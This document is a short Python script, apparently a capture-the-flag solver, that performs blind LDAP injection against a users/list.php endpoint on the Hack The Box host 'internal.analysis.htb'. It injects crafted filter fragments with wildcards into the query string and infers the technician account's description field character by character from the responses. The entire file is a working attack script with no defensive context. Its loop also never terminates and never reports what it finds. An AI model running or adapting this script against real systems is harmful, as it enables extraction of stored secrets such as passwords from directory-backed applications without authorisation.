import string 
import requests
from pwn import *
base_url="http://internal.analysis.htb/users/list.php"
test_characters= string.ascii_letters + string.digits + '*!@#$%^&()_-+=~`'
def ldap_injection():
    p1=log.progress("LDAP injection")
    p1.status("starting LDAP injection")
    base_payload=f"name=technician)(description="
    found_string=""
    while True:
        find=False
        for char in test_characters:
            escaped_char = char.replace('*', '\\2a')  # Escape '*' as '\2a'
            # Construct the payload dynamically
            payload = f"{base_payload}{found_string}{escaped_char}*"
            p1.status(f"{base_payload}{found_string}{char}*")
            #payload=f"{base_payload}{found_string}{char}*"
            url=f"{base_url}?{payload}"
            try:
                response = requests.get(url, timeout=10)
                if "technician" in response.text:
                 found_string+=char
                 find=True
                 break
            except requests.exceptions.RequestException as e:
                log.failure(f"Error with payload {char}: {e}")
        if not find:
            found_string+='*'
            continue
if __name__ == "__main__":
    ldap_injection()
